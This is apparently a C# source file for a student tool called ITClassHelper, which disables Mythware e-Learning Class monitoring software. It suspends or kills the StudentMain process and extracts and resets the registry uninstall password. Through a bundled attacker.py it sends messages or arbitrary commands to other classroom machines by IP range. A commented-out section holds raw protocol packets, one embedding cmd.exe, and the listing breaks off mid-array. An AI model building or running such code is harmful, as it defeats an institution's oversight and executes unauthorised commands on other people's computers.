using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;

namespace ITClassHelper
{
    public partial class MainWindow : Form
    {
        public static class ProcessMgr
        {
            [Flags]
            public enum ProcessAccess : uint
            {
                Terminate = 0x1,
                CreateThread = 0x2,
                SetSessionId = 0x4,
                VmOperation = 0x8,
                VmRead = 0x10,
                VmWrite = 0x20,
                DupHandle = 0x40,
                CreateProcess = 0x80,
                SetQuota = 0x100,
                SetInformation = 0x200,
                QueryInformation = 0x400,
                SetPort = 0x800,
                SuspendResume = 0x800,
                QueryLimitedInformation = 0x1000,
                Synchronize = 0x100000
            }

            [DllImport("ntdll.dll")]
            private static extern uint NtResumeProcess([In] IntPtr processHandle);

            [DllImport("ntdll.dll")]
            private static extern uint NtSuspendProcess([In] IntPtr processHandle);

            [DllImport("ntdll.dll", SetLastError = true)]
            private static extern uint NtTerminateProcess([In] IntPtr processHandle);

            [DllImport("kernel32.dll", SetLastError = true)]
            private static extern IntPtr OpenProcess(
             ProcessAccess desiredAccess,
             bool inheritHandle,
             int processId);

            [DllImport("kernel32.dll", SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            private static extern bool CloseHandle([In] IntPtr handle);

            public static void SuspendProcess(int processId)
            {
                IntPtr hProc = IntPtr.Zero;
                try
                {
                    hProc = OpenProcess(ProcessAccess.SuspendResume, false, processId);
                    if (hProc != IntPtr.Zero)
                        NtSuspendProcess(hProc);
                }
                finally
                {
                    if (hProc != IntPtr.Zero)
                        CloseHandle(hProc);
                }
            }

            public static void ResumeProcess(int processId)
            {
                IntPtr hProc = IntPtr.Zero;
                try
                {
                    hProc = OpenProcess(ProcessAccess.SuspendResume, false, processId);
                    if (hProc != IntPtr.Zero)
                        NtResumeProcess(hProc);
                }
                finally
                {
                    if (hProc != IntPtr.Zero)
                        CloseHandle(hProc);
                }
            }
        }

        public static class HotKey
        {
            [DllImport("user32.dll", SetLastError = true)]
            public static extern bool RegisterHotKey(
                IntPtr hWnd,
                int hotkeyId,        
                KeyModifiers keyModifiers,
                Keys keys
                );

            [DllImport("user32.dll", SetLastError = true)]
            public static extern bool UnregisterHotKey(
                IntPtr hWnd,
                int hotkeyId
                );

            [Flags]
            public enum KeyModifiers
            {
                None = 0,
                Alt = 1,
                Ctrl = 2,
                Shift = 4,
                Windows = 8
            }
        }

        MiniController castControlWindow = new MiniController();
        static readonly string ProgramVersion = "1.6.3";
        string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        string attackScriptPath;
        string roomPath = @"C:\Program Files\Mythware\e-Learning Class\StudentMain.exe";
        readonly string disableAttackFilePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\disableAttack.txt";

        [DllImport("user32.dll")]
        public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

        [DllImport("user32.dll", EntryPoint = "MoveWindow")]
        public static extern bool MoveWindow(IntPtr hWnd, int X, int Y, int nWidth, int nHeight, bool bRepaint);

        public MainWindow()
        {
            InitializeComponent();
            ProgramVerLabel.Text = ProgramVerLabel.Text.Replace("X.Y.Z", ProgramVersion);
            castControlWindow.Show();
            castControlWindow.Hide();
            HotKey.RegisterHotKey(Handle, 100, HotKey.KeyModifiers.Alt, Keys.H);
        }

        private void MainWindow_Load(object sender, EventArgs e)
        {
            if (File.Exists(disableAttackFilePath))
            {
                DisableAttackButton.Enabled = false;
                AttackButton.Enabled = false;
            }

            string ntsdPath = path + @"\ntsd.exe";
            if (!File.Exists(ntsdPath))
            {
                byte[] RescNtsd = Properties.Resources.Ntsd;
                FileStream ntsdFsObj = new FileStream(ntsdPath, FileMode.CreateNew);
                ntsdFsObj.Write(RescNtsd, 0, RescNtsd.Length);
                ntsdFsObj.Close();
            }

            string attackerPath = path + @"\attacker.py";
            byte[] RescAttacker = Properties.Resources.Attacker;
            FileStream attackerFsObj = new FileStream(attackerPath, FileMode.Create);
            attackerFsObj.Write(RescAttacker, 0, RescAttacker.Length);
            attackerFsObj.Close();

            string scripterPath = path + @"\ITCHScripter.exe";
            byte[] RescScripter = Properties.Resources.Scripter;
            FileStream scripterFsObj = new FileStream(scripterPath, FileMode.Create);
            scripterFsObj.Write(RescScripter, 0, RescScripter.Length);
            scripterFsObj.Close();

            new Thread(LoopThread)
            { IsBackground = true }.Start();
        }

        private void LoopThread()
        {
            while (true)
            {
                IntPtr studentWindow = FindWindow(null, "屏幕演播室窗口");
                if (MousePosition == new Point(0, 0))
                {
                    MoveWindow(studentWindow, 337, 186, 1000, 500, true);
                    castControlWindow.Show();
                }
                Process[] studentProc = Process.GetProcessesByName("StudentMain");
                if (studentProc.Length == 0)
                {
                    RoomStatusLabel.Text = "未在运行";
                    RoomStatusLabel.ForeColor = Color.Green;
                }
                else
                {
                    RoomStatusLabel.Text = "正在运行";
                    RoomStatusLabel.ForeColor = Color.Red;
                }
                Thread.Sleep(1000);
            }
        }


        private void ExitProgram_Click(object sender, EventArgs e)
        {
            ShowExitProgram();
        }

        private void ShowExitProgram()
        {
            if (MessageBox.Show("确定退出机房助手？", "退出", MessageBoxButtons.OKCancel) == DialogResult.OK)
            {
                HotKey.UnregisterHotKey(Handle, 100);
                Environment.Exit(0);
            }
        }

        private void PauseRoomButton_Click(object sender, EventArgs e)
        {
            PauseRoom();
        }

        private static void PauseRoom()
        {
            try
            {
                Process studentProc = Process.GetProcessesByName("StudentMain")[0];
                ProcessMgr.SuspendProcess(studentProc.Id);
            }
            catch { }
        }

        private void CloseRoomButton_Click(object sender, EventArgs e)
        {
            CloseRoom();
        }

        private void CloseRoom()
        {
            string ntsdPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\ntsd.exe";
            ExecuteProcess(ntsdPath, "-c q -pn StudentMain.exe");
            new Thread( x => { Thread.Sleep(1000); ExecuteProcess("taskkill", "/f /im ntsd.exe"); } ).Start();
        }

        private void ExecuteProcess(string process, string arguments, bool noHide = false)
        {
            Process ExeProcess = new Process();
            ProcessStartInfo ExeProcessInfo;
            if (noHide == true)
            {
                ExeProcessInfo = new ProcessStartInfo
                {
                    FileName = process,
                    Arguments = arguments
                };
            }
            else
            {
                ExeProcessInfo = new ProcessStartInfo
                {
                    FileName = process,
                    Arguments = arguments,
                    WindowStyle = ProcessWindowStyle.Hidden
                };
            }
            ExeProcess.StartInfo = ExeProcessInfo;
            ExeProcess.Start();
        }

        private void RecoverRoomButton_Click(object sender, EventArgs e)
        {
            RecoverRoom();
        }

        private void RecoverRoom()
        {
            try
            {
                Process studentProc = Process.GetProcessesByName("StudentMain")[0];
                ProcessMgr.ResumeProcess(studentProc.Id);
            }
            catch
            {
                try { ExecuteProcess(roomPath, "", true); }
                catch { }
            }
        }

        private void AttackTypeRadio_CheckedChanged(object sender, EventArgs e)
        {
            CmdTextBox.Enabled = UseCmdRadio.Checked;
            MsgTextBox.Enabled = UseMsgRadio.Checked;
            ChooseScriptButton.Enabled = UseScriptRadio.Checked;
        }

        private void AttackButton_Click(object sender, EventArgs e)
        {
            string scriptPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\attacker.py";
            string baseArguments = $@"{scriptPath} -p {PortTextBox.Text} -ip {IPTextBox.Text}";
            if (IPTextBox.Text.Split('.')[3] != IPRangeTextBox.Text)
            {
                baseArguments += $"-{IPRangeTextBox.Text}";
            }
            if (UseMsgRadio.Checked == true  || UseCmdRadio.Checked == true)
            {
                string attackItem;
                if (UseMsgRadio.Checked == true) attackItem = $"-msg {MsgTextBox.Text.Replace("\n", "").Replace("\r", "")}";
                else attackItem = $"-c \"{CmdTextBox}\"";
                try { ExecuteProcess("python", $"{baseArguments} {attackItem}"); }
                catch { 
                    try { ExecuteProcess("py", $"{baseArguments} {attackItem}"); }
                    catch { MessageBox.Show("未安装运行环境！请点击[安装运行环境]安装！", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error); }
                }
            }
            else
            {
                if (IPTextBox.Text.Split('.')[3] != IPRangeTextBox.Text)
                {
                    MessageBox.Show("暂不支持向多台设备发送脚本！", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                else
                {
                    try
                    {
                        using (StreamReader sr = new StreamReader(attackScriptPath))
                        {
                            string fileLine;
                            while ((fileLine = sr.ReadLine()) != null)
                            {
                                try
                                {
                                    ExecuteProcess("python", $"{baseArguments} -c \"{fileLine}\"");
                                }
                                catch
                                {
                                    ExecuteProcess("py", $"{baseArguments} -c \"{fileLine}\"");
                                }
                                Thread.Sleep(1500);
                            }
                        }
                    }
                    catch { MessageBox.Show("未选择脚本！", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error); }
                }
            }
        }

        private void IPButton_Click(object sender, EventArgs e)
        {
            string realAddress = "无法获取到当前 IP 地址！请检查网络是否正常！";
            foreach (IPAddress curAddress in Dns.GetHostEntry(Dns.GetHostName()).AddressList)
            {
                if (curAddress.AddressFamily.ToString() == "InterNetwork")
                {
                    realAddress = curAddress.ToString();
                }
            }
            MessageBox.Show($"IP 地址为：{realAddress}", "信息", MessageBoxButtons.OK);
        }

        private void DisableAttackButton_Click(object sender, EventArgs e)
        {
            DisableAttackButton.Enabled = false;
            try
            {
                File.Create(disableAttackFilePath); 
            }
            catch { }
        }

        private void UpdateProgramButton_Click(object sender, EventArgs e)
        {
            string updaterPath = Application.StartupPath + @"\ITCHUpdater.exe";
            if (File.Exists(updaterPath))
            {
                ExecuteProcess(updaterPath, "", true);
                HotKey.UnregisterHotKey(Handle, 100);
                Environment.Exit(0);
            }
            else
            {
                MessageBox.Show("更新程序不存在！请前往 url.cy/0sR4gf 下载！", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void InstallPythonButton_Click(object sender, EventArgs e)
        {
            string pythonInstallerPath = Application.StartupPath + @"\PythonInstaller.exe";
            string arguments =
@"/passive PrependPath=1 InstallAllUsers=0 AssociateFiles=1 Shortcuts=1 
Include_doc=0 Include_debug=1 Include_dev=1 Include_exe=1 Include_launcher=1 
InstallLauncherAllUsers=1 Include_lib=1 Include_pip=1 Include_symbols=1 
Include_tcltk=1 Include_test=1 Include_tools=1";
            if (File.Exists(pythonInstallerPath))
            {
                ExecuteProcess(pythonInstallerPath, arguments);
            }
            else
            {
                MessageBox.Show("Python 安装程序不存在！请点击[更新软件]下载！", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void ChooseScriptButton_Click(object sender, EventArgs e)
        {
            OpenFileDialog fileDialog = new OpenFileDialog
            {
                Multiselect = false,
                Title = "选择脚本文件",
                Filter = "BAT脚本(*.bat)|*.bat"
            };
            if (fileDialog.ShowDialog() == DialogResult.OK)
            {
                attackScriptPath = fileDialog.FileName;
            }
        }

        private void ConvertButton_Click(object sender, EventArgs e)
        {
            MessageBox.Show(
$@"即将显示一个命令窗口。
请稍等几秒，然后记下其中的 MAC 地址。
接着，按下回车键，在出现的表格中找到对应的 IP 地址。
此地址即为该计算机名对应的地址。"
            , "使用须知", MessageBoxButtons.OK, MessageBoxIcon.Information);
            ExecuteProcess("cmd", $"/c nbtstat -a {PCNameTextBox.Text} && pause && cls && arp -a && pause", true);
        }

        private void ChooseRoomButton_Click(object sender, EventArgs e)
        {
            Process[] studentProcs = Process.GetProcessesByName("StudentMain");
            if (studentProcs.Length != 0)
            {
                roomPath = studentProcs[0].MainModule.FileName;
                MessageBox.Show("已自动读取到教室程序路径！", "信息", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            else
            {
                OpenFileDialog fileDialog = new OpenFileDialog
                {
                    Multiselect = false,
                    Title = "选择教室程序",
                    Filter = "教室程序(*.exe)|*.exe"
                };
                if (fileDialog.ShowDialog() == DialogResult.OK)
                {
                    roomPath = fileDialog.FileName;
                }
            }
        }

        private void GetPswdButton_Click(object sender, EventArgs e)
        {
            RegistryKey pswdKey;
            try
            {
                pswdKey = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\TopDomain\e-Learning Class Standard\1.00");
            }
            catch { pswdKey = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\TopDomain\e-Learning Class\1.00"); }
            string longPswd = (string)pswdKey.GetValue("UninstallPasswd");
            MessageBox.Show($"密码为：{longPswd.Replace("Passwd", "")}", "信息", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void SetPswdButton_Click(object sender, EventArgs e)
        {
            string keyDir = @"HKEY_LOCAL_MACHINE\SOFTWARE\TopDomain\e-Learning Class Standard\1.00";
            string pswdText = Interaction.InputBox("请输入要设置的密码：", "信息", "defaultPswd", -1, -1);
            if (pswdText != "defaultPswd") Registry.SetValue(keyDir, "UninstallPasswd", $@"Passwd{pswdText}");
            CloseRoom();
            new Thread(x => { Thread.Sleep(1000); RecoverRoom(); }) { IsBackground = true }.Start();
        }

        private void ScripterButton_Click(object sender, EventArgs e)
        {
            string scripterPath = path + @"\ITCHScripter.exe";
            OpenFileDialog fileDialog = new OpenFileDialog
            {
                Multiselect = false,
                Title = "选择脚本文件",
                Filter = "原始BAT脚本(*.bat)|*.bat"
            };
            if (fileDialog.ShowDialog() == DialogResult.OK)
            {
                ExecuteProcess(scripterPath, fileDialog.FileName, true);
            }
        }

        protected override void WndProc(ref Message msg)
        {
            const int WM_HOTKEY = 0x0312;
            switch (msg.Msg)
            {
                case WM_HOTKEY:
                switch (msg.WParam.ToInt32())
                {
                    case 100:
                    Visible = !Visible;
                    break;
                }
                break;
            }
            base.WndProc(ref msg);
        }

        /* SendAttackPack()
                private void SendAttackPack(string attackType, string attackContent)
                {
                    List<List<byte>> attackPacks = new List<List<byte>> {
                        new List<byte> {
                    0x44,
                    0x4d,
                    0x4f,
                    0x43,
                    0x00,
                    0x00,
                    0x01,
                    0x00,
                    0x9e,
                    0x03,
                    0x00,
                    0x00,
                    0x10,
                    0x41,
                    0xaf,
                    0xfb,
                    0xa0,
                    0xe7,
                    0x52,
                    0x40,
                    0x91,
                    0xdc,
                    0x27,
                    0xa3,
                    0xb6,
                    0xf9,
                    0x29,
                    0x2e,
                    0x20,
                    0x4e,
                    0x00,
                    0x00,
                    0xc0,
                    0xa8,
                    0x50,
                    0x81,
                    0x91,
                    0x03,
                    0x00,
                    0x00,
                    0x91,
                    0x03,
                    0x00,
                    0x00,
                    0x00,
                    0x08,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x05,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00
                },
                        new List<byte> {
                    0x44,
                    0x4d,
                    0x4f,
                    0x43,
                    0x00,
                    0x00,
                    0x01,
                    0x00,
                    0x6e,
                    0x03,
                    0x00,
                    0x00,
                    0x5b,
                    0x68,
                    0x2b,
                    0x25,
                    0x6f,
                    0x61,
                    0x64,
                    0x4d,
                    0xa7,
                    0x92,
                    0xf0,
                    0x47,
                    0x00,
                    0xc5,
                    0xa4,
                    0x0e,
                    0x20,
                    0x4e,
                    0x00,
                    0x00,
                    0xc0,
                    0xa8,
                    0x64,
                    0x86,
                    0x61,
                    0x03,
                    0x00,
                    0x00,
                    0x61,
                    0x03,
                    0x00,
                    0x00,
                    0x00,
                    0x02,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x0f,
                    0x00,
                    0x00,
                    0x00,
                    0x01,
                    0x00,
                    0x00,
                    0x00,
                    0x43,
                    0x00,
                    0x3a,
                    0x00,
                    0x5c,
                    0x00,
                    0x57,
                    0x00,
                    0x69,
                    0x00,
                    0x6e,
                    0x00,
                    0x64,
                    0x00,
                    0x6f,
                    0x00,
                    0x77,
                    0x00,
                    0x73,
                    0x00,
                    0x5c,
                    0x00,
                    0x73,
                    0x00,
                    0x79,
                    0x00,
                    0x73,
                    0x00,
                    0x74,
                    0x00,
                    0x65,
                    0x00,
                    0x6d,
                    0x00,
                    0x33,
                    0x00,
                    0x32,
                    0x00,
                    0x5c,
                    0x00,
                    0x63,
                    0x00,
                    0x6d,
                    0x00,
                    0x64,
                    0x00,
                    0x2e,
                    0x00,
                    0x65,
                    0x00,
                    0x78,
                    0x00,
                    0x65,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
                    0x00,
